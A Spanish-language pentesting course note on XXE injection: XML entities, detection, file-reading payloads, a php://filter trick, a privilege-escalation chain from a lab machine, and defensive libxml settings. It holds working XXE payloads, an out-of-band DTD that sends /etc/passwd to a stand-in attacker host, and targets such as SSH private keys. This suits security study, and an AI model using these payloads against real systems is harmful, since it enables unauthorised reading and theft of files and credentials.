

> [!info] Relacionado con
> [[Vulnerabilidades Web - OWASP Top 10 y Burp Suite]] · [[Burp Suite - Framework de Auditoría]] · [[OWASP Top 10 - CVE CVSS CWE]] · [[SSRF - Server-Side Request Forgery]]

---

## ① Fundamentos de XML

**XML (eXtended Markup Language)** = formato de datos **estructurado**. No es HTML.

| Concepto | Descripción |
|----------|-------------|
| **Estructurado** | Datos con jerarquía (etiquetas, atributos): JSON, XML, SQL, SAP |
| **No estructurado** | Texto libre, sin formato predefinido (mensajes, chat) |
| **Entidades** | Variables que representan valores. Pueden ser internas o externas |
| **SYSTEM attribute** | Indica que la entidad carga un recurso externo (fichero, URL) |

> [!important] Analogía del parser
> A un servidor no le puedes lanzar lenguaje no estructurado: necesita saber qué formato va a recibir para hacer el **parser** (extracción de datos por campo). Igual que PHP usa `$_GET['param']`, XML usa entidades invocadas con `&...;`.

### Estructura de un XML

```xml
<?xml version="1.0" encoding="UTF-8"?>
<usuario>
  <nombre>Mariana</nombre>
  <email>artevolves@ejemplo.com</email>
</usuario>
```

- `<usuario>` → clase/etiqueta
- `<nombre>` → atributo/propiedad
- `</usuario>` → cierre de etiqueta

> [!warning] El secreto mejor guardado
> **Word y PDF son XML por debajo.** XML es el lenguaje más utilizado del mundo, aunque pensemos que no se usa. JSON es el "hermano conocido" (muy usado en JWT).

### Entidad interna (ejemplo)

```xml
<?xml version="1.0"?>
<!DOCTYPE nota [
  <!ENTITY empresa "Seguros Norte S.A.">
]>
<nota>Bienvenido a &empresa;</nota>
```

Resultado: `Bienvenido a Seguros Norte S.A.`

### Ejemplo de entidad externa (SYSTEM)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

> [!important] El SYSTEM attribute es la clave
> Cuando el servidor procesa `SYSTEM "file:///etc/passwd"`, **lee el fichero y lo sustituye** en la respuesta. Ahí es donde se explota XXE. `SYSTEM` también admite `http://` o `ftp://` para llamadas salientes (SSRF).

> [!note] Diferencia con Python `import os`
> En Python: `os.system()` ejecuta **comandos**. En XML: `SYSTEM` lee **ficheros** del sistema (solo lectura, no ejecución).

---

## ② Detección

### Cabeceras para forzar XML

| Cabecera | Valor | Efecto |
|----------|-------|--------|
| `Accept` | `application/xml` | El servidor responde en XML |
| `Content-Type` | `application/xml` | Envías XML al servidor |

En Burp/DevTools revisar cabeceras como:
```
Accept: text/html, application/xhtml+xml, application/xml;q=0.9
                                           ^^^^^^^^^^^^^^^^^
                                           → Acepta XML
Content-Type: application/xml
^^^^^^^^^^^^^^^ → Envía XML
```

> [!important] La regla de oro
> Si en los headers ves `application/xml` en `Accept` o `Content-Type`, lo más probable es que puedas enviarle un XML y sea capaz de procesarlo. Muchas APIs aceptan XML aunque no lo muestren: forzar `Accept: application/xml` puede revelar endpoints ocultos.

### GET vs POST

- **GET** pide información y la devuelve.
- **POST** envía información que el servidor debe **validar** (formulario, login, bloque XML).

> [!tip] Regla práctica
> Cuando vayas a enviar datos para que el servidor los procese, cambia a **POST** (Burp: clic derecho → *Change request method*; curl: `-X POST`). A veces funciona sin cambiarlo, otras peta.

### Metodología incremental (no ir dos pasos por delante)

```
1. Petición vacía → Error Base ("not provided", "Start Tag Expected")
2. Cambiar GET → POST y enviar un parámetro cualquiera
3. Bloque XML básico → ¿200 + REFLECTED? → parser activo
4. Entidad interna (variable) → ¿la resuelve?
5. Entidad externa SYSTEM → file:///etc/passwd
6. Exfiltrar: /etc/passwd → usuarios → Hydra/SSH → post-explotación
```

> [!important] La regla de oro de Castillo
> "No penséis en 'necesito llegar a la máquina final'. Pensad en '¿qué puedo sacar AHORA con lo que tengo?'. Pequeños pasos, ir con calma, analizar cada response."

---

## ③ Ciclo de explotación XXE

```
1. Detectar que el servidor procesa XML
 ↓
2. Enviar XML vacío → ver si responde
 ↓
3. Testear con DTD simple (DOCTYPE)
 ↓
4. Inyectar SYSTEM entity → leer ficheros
 ↓
5. Explotar: /etc/passwd, configuraciones, PHP
```

---

## ④ Lectura de ficheros

### Fichero básico

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
 <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### Ficheros PHP (codificados en Base64)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
 <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=config.php">
]>
<root>&xxe;</root>
```

> [!warning] PHP require codificación
> Los ficheros PHP **no se pueden leer directamente** con `file://` porque contienen `<` y `>` que **rompen el parser XML**. Usa `php://filter/convert.base64-encode` y decodifica con `base64 -d`.

> [!important] ¿Por qué Base64?
> Base64 solo tiene números, letras y `+`, `/`, `=`. **Nunca tiene `<` ni `>`,** así que nunca rompe la codificación XML. Es un "wrapper" (envoltorio): cuando algo no rompe el parser, hay que **envolverlo** antes de que se procese.

### Filtros PHP útiles (cheat sheet)

```bash
php://filter/convert.base64-encode/resource=/etc/passwd
php://filter/convert.base64-encode/resource=/var/www/html/config.php
php://filter/string.toupper/resource=/etc/passwd
php://filter/string.rot13/resource=/etc/passwd
```

### Qué extraer con un LFI (más allá de /etc/passwd)

- Ruta base de la web (`/var/www/html`)
- `.bash_history`
- Claves privadas SSH: `/home/<usuario>/.ssh/id_rsa`
- Ficheros de config con credenciales BD
- Diccionarios LFI de **SecLists**: `/usr/share/seclists/Fuzzing/LFI/`

> [!note] LFI no lista directorios
> Solo lees rutas que conoces o intuyes por contexto. No sabes si un fichero "no responde" porque no existe o porque no tienes permiso: es el contexto que no controlas.

### Out-of-band (OOB) — exfiltración HTTP/DNS

```xml
<!DOCTYPE test [
  <!ENTITY % remote SYSTEM "http://atacante.com/evil.dtd">
  %remote;
  %send;
]>
```

```xml
<!-- evil.dtd en el servidor del atacante: -->
<!ENTITY % payload SYSTEM "file:///etc/passwd">
<!ENTITY % send "<!ENTITY exfil SYSTEM 'http://atacante.com/?data=%payload;'>">
```

Útil cuando la respuesta **no refleja** el contenido del fichero.

---

## ④b XXE ≠ RCE (directamente)

> [!important] La distinción clave de Castillo
> "XXE te da **lectura arbitraria de ficheros**. No te da ejecución de comandos *per se*. Para RCE necesitas encadenar: XXE → LFI → subir webshell → ejecutar. O XXE → leer SSH key → SSH. O XXE → leer config.php → credenciales BD → reutilización. **Siempre es una cadena.**"

Cadena real (máquina Castor/Nike):
```
XXE → LFI (/etc/passwd) → datos.php (Base64) → credenciales
→ Hydra SSH → usuario con rbash → bypass ssh -t "bash"
→ sudo -l → GTFOBins (java/python) → movimiento lateral
→ cron/script hijack → ROOT
```

> [!quote] Frase de la sesión
> "Ya no estamos jugando con vulnerabilidades de 'hago un SQL, ahora hago una fuerza bruta'. Ahora ya tenemos algo más de chicha. Hay que pensar, entender sobre todo, y concatenar vulnerabilidades." — Carlos Gómez Pintado

---

## ⑤ XXE vs Path Traversal

| Característica | XXE | Path Traversal |
|---------------|-----|----------------|
| **Mecanismo** | Entidad XML externa | Ruta relativa `../` |
| **Formato** | XML (parámetros, bodies) | URLs, formularios, parámetros |
| **Ficheros** | Cualquier fichero legible | Mismos ficheros |
| **Blind** | Sí (con error-based) | Sí (con response timing) |
| **Filtrado** | Validación de XML | Validación de rutas |

### Ejemplo comparativo (Rockstar vs Castor)

| Aspecto | Rockstar (Path Traversal) | Castor (XXE) |
|---------|---------------------------|--------------|
| **Vector** | Parámetro con nombre de fichero | Endpoint que acepta XML |
| **Mecanismo** | `../` para navegar directorios | Entidad `SYSTEM "file:///"` |
| **Resultado** | LFI (lectura de fichero) | LFI (lectura de fichero) |
| **Acceso** | Desde el directorio hacia atrás | Desde la estructura del backend |

> [!important] LFI es consecuencia, no la vulnerabilidad en sí
> El Local File Inclusion **no es la vulnerabilidad**, sino el **resultado** de explotar una vulnerabilidad previa (Path Traversal o XXE).

---

## ⑥ Error Base

Cuando XXE no muestra el contenido pero **sí muestra errores**:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
 <!ENTITY xxe SYSTEM "file:///noexiste.txt">
]>
<root>&xxe;</root>
```

> [!note] Error-based XXE
> Si el servidor devuelve un error como "fichero no encontrado" o "permission denied", el XXE funciona pero **no puedes leer el contenido directamente**. Úsalo para confirmar la vulnerabilidad y luego encadenar con Blind SSRF.

### Ejemplos de Error Base

Cuando envías texto plano o PHP en un endpoint XML:
```
hola            → "Start Tag Expected, '<' Not Found"
<?php ... ?>    → "Start Tag Expected" (no acepta PHP)
XML válido      → 200 OK + contenido REFLECTED
```

> [!important] Error Base = tu mejor aliado
> Un error descriptivo ("XML not provided", "Start tag expected") es **exposición de información**: la app te dice qué espera. Forzar el error hasta que "pete" no es perder el tiempo: revela lenguaje, motor y formato. Pega el error en Google/IA para identificar tecnología.

> [!tip] El 500 es tu amigo
> Un Internal Server Error significa que tu input rompió algo en el backend → **interactuaste con la lógica del servidor**. En Gobuster incluye siempre `-s "200,301,500"`: `datos.php` (con credenciales) devolvía 500 y por defecto **no se veía**.

---

## ⑦ File Upload y XXE

Las 4 formas en que un file upload puede ejecutar código:

| Forma | Mecanismo | Nivel |
|-------|-----------|-------|
| **Form 1** | Acceder a la ruta: subes `.php` y accedes a `uploads/shell.php` | Básico |
| **Form 2** | Un tercero lo ejecuta (ingeniería social) o bypass de rename/extensión | Intermedio |
| **Form 3** | Cron job que ejecuta el fichero periódicamente / validación MIME | Intermedio |
| **Form 4** | **Preview/visualización:** subes XML/PDF/SVG y el servidor procesa el contenido → XXE | **Preview de XXE** |

> [!warning] Form 4 es la preview
> Cuando el servidor procesa ficheros XML subidos (SVG, DOCX, XLSX, PDF) y no valida el contenido, puedes inyectar XXE directamente en el fichero subido. La **visualización en memoria (preview)** se descarta si está bien programado; el **perfil guardado** persiste en el servidor (más peligroso). Intercepta con Burp y modifica **ANTES** de que llegue al servidor.

---

## ⑧ Prevención (Blue Team)

## ⑧ Prevención (Blue Team)

### Configuración segura PHP (libxml)

```php
// PHP < 8.0: deshabilitar entidades externas globalmente
libxml_disable_entity_loader(true);

// PELIGROSO (no usar en prod):
$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);

// LO CORRECTO: parser sin red, sin entities externas
$dom = new DOMDocument();
$dom->loadXML($xml, LIBXML_NONET);
```

### Mitigaciones por capas

| Capa | Medida |
|------|--------|
| **Código** | `libxml_disable_entity_loader(true)` / `LIBXML_NONET` |
| **WAF/IDS** | Bloquear `<!DOCTYPE`, `<!ENTITY`, `SYSTEM`, `PUBLIC` en body XML |
| **Servidor** | Usuario web (`www-data`) sin permisos de lectura en `/etc`, `/home`, `/root` |
| **Red** | Egress filtering: el servidor no debe hacer requests salientes arbitrarios |
| **Monitoring** | Alertar en logs: "External entity", "Entity expansion", XML parse errors inusuales |

---

## ⑨ Quote de la sesión

> [!important] "Ya no estamos jugando con vulnerabilidades de 'hago un SQL'. Ahora ya tenemos algo más de chicha."
> XXE, SSTI y SSRF son vulnerabilidades que escalan directamente a RCE o compromiso de infraestructura. No son glitches menores. Hay que pensar, entender y **concatenar vulnerabilidades**.

---

## ⑩ Herramientas

| Herramienta | Objetivo |
|------------|----------|
| **Burp Suite (Repeater)** | Enviar peticiones XML modificadas; Scanner detecta XXE básico |
| **curl** | Testing rápido de XXE desde terminal |
| **XXEtest (Burp extension)** | Automatización de tests XXE |
| **XXEinjector** | Automatiza XXE OOB, filtra entidades, extrae ficheros |
| **XCat** | XXE exploitation toolkit (OOB, filtros) |
| **oxml_xxe** | Script Python para XXE rápido |
| **Gobuster/ffuf** | Descubrir endpoints XML (`-s "200,301,500"`) |
| **SecLists (LFI)** | Diccionarios de rutas por SO para el LFI posterior |
| **Hydra** | Fuerza bruta tras extraer usuarios de /etc/passwd |
| **GTFOBins** | Escalada tras el acceso inicial (sudo -l, SUID) |

### curl de ejemplo

```bash
curl -X POST http://target/api \
 -H "Content-Type: application/xml" \
 -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
```

> [!tip] IA como apoyo
> Cuando encuentres un error Base, pégalo a la IA: "¿De qué lenguaje/formato es este error?" → te genera un XML de prueba adecuado. Usa IA con criterio para generar payloads XXE o valorar defensas, pero **entiende la lógica** antes de copiar.

---

## Checklist de repaso

- [ ] ¿Sé qué es XML, qué es una entidad SYSTEM y por qué Word/PDF son XML?
- [ ] ¿Puedo detectar XXE forzando cabeceras Accept/Content-Type y leyendo Error Base?
- [ ] ¿Sigo el ciclo incremental: vacío → POST → XML → entidad interna → SYSTEM?
- [ ] ¿Sé leer /etc/passwd y por qué los PHP requieren Base64 (`php://filter`)?
- [ ] ¿Entiendo que LFI es consecuencia de XXE/Path Traversal, no la vuln en sí?
- [ ] ¿Distingo XXE de Path Traversal (Rockstar vs Castor)?
- [ ] ¿Conozco el concepto de Error Base y por qué "el 500 es tu amigo"?
- [ ] ¿Entiendo las 4 formas de ejecutar un file upload y que Form 4 es XXE en preview?
- [ ] ¿Sé que XXE da lectura arbitraria, NO RCE directo (hay que encadenar)?
- [ ] ¿Tengo claro el payload OOB con evil.dtd para exfiltración ciega?
- [ ] ¿Recuerdo mitigaciones Blue Team (libxml_disable_entity_loader, LIBXML_NONET)?
- [ ] ¿Sé encadenar post-explotación: Hydra → rbash bypass → sudo -l → GTFOBins?









---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[../comandos/WPScan.md|WPScan]] — Netcat / Reverse Shells, WPScan, XXE
- [[SSTI - Server-Side Template Injection.md|SSTI - Server-Side Template Injection]] — Testing, WPScan, XXE
- [[../../apuntes Chema/SSTI - PortSwigger.md|SSTI - PortSwigger]] — Netcat / Reverse Shells, Redes, XXE
- [[../../apuntes Joselu/MODULO3/resumen_master_clase49.md|resumen_master_clase49]] — Desarrollo Web, Netcat / Reverse Shells, XXE
- [[../../apuntes Andres/11.07.2026 Owasp Top 10 XXE Labs II.md|11.07.2026 Owasp Top 10 XXE Labs II]] — Netcat / Reverse Shells, Redes, XXE

### 🌐 Cross-Dominio

- [[../../../programacion/Csharp/xamarin_maui.md|xamarin_maui]] — Programacion: Desarrollo Web, SQL, Testing
- [[../../../programacion/Ciberseguridad/wordpress_security.md|wordpress_security]] — Programacion: Desarrollo Web, SQL, Testing

> #burpsuite #cli #command_injection #file_upload #lfi #metasploit #netcat #pentest #redes #sql #ssrf #ssti #testing #web #wpscan #xxe
